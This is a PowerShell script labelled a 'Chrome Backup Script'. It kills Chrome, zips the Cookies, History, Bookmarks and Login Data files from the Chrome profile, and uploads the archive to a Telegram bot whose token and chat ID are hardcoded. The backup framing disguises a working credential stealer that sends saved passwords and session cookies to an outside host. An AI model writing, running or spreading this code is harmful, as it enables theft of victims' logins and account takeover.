$botToken = "8529187820:AAGN2vlcmLBtf-EaZKWfkR9ufRrVOssQMKo"  
$chatId   = "8121448802"   

$localAppData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$timestamp = (Get-Date).ToString('yyyyMMdd_HHmmss')
$zipPath = "$env:TEMP\ChromeBackup_$timestamp.zip"

Write-Host "==== Chrome Backup Script Started ====" -ForegroundColor Cyan

Write-Host "[1/3] Terminating Chrome processes..." -ForegroundColor Yellow
Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

Write-Host "[2/3] Compressing Chrome data..." -ForegroundColor Yellow

if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

$filesToBackup = @(
    "$localAppData\Default\Cookies",
    "$localAppData\Default\History",
    "$localAppData\Default\Bookmarks",
    "$localAppData\Default\Login Data",
    "$localAppData\Default\Cookies"
)

$validFiles = $filesToBackup | Where-Object { Test-Path $_ }

if ($validFiles.Count -eq 0) {
    Write-Error "Chrome data files not found or path is incorrect."
    exit
}

try {
    Compress-Archive -Path $validFiles -DestinationPath $zipPath -Force
    Write-Host "Backup saved locally at: $zipPath" -ForegroundColor Green
}
catch {
    Write-Error "Compression failed: $_"
    exit
}
Write-Host "[3/3] Uploading file to Telegram..." -ForegroundColor Yellow

function Send-TelegramDocument {
    param (
        [string]$token,
        [string]$chat_id,
        [string]$filePath
    )

    $url = "https://api.telegram.org/bot$token/sendDocument"
    $fileItem = Get-Item $filePath
    
    Add-Type -AssemblyName 'System.Net.Http'
    $client = New-Object System.Net.Http.HttpClient
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $content.Add($fileContent, "document", $fileItem.Name)
    $content.Add((New-Object System.Net.Http.StringContent($chat_id)), "chat_id")
    $content.Add((New-Object System.Net.Http.StringContent("Chrome Backup Complete! ($timestamp)")), "caption")

    try {
        $task = $client.PostAsync($url, $content)
        $task.Wait()
        $result = $task.Result
        
        if ($result.IsSuccessStatusCode) {
            Write-Host "Upload Successful! Check your Telegram." -ForegroundColor Cyan
        } else {
            Write-Error "Upload Failed. Status: $($result.StatusCode)"
        }
    }
    catch {
        Write-Error "Network Error: $_"
    }
    finally {
        $fileStream.Dispose()
        $client.Dispose()
        $content.Dispose()
    }
}
Send-TelegramDocument -token $botToken -chat_id $chatId -filePath $zipPath

Write-Host "==== Process Finished ====" -ForegroundColor Cyan
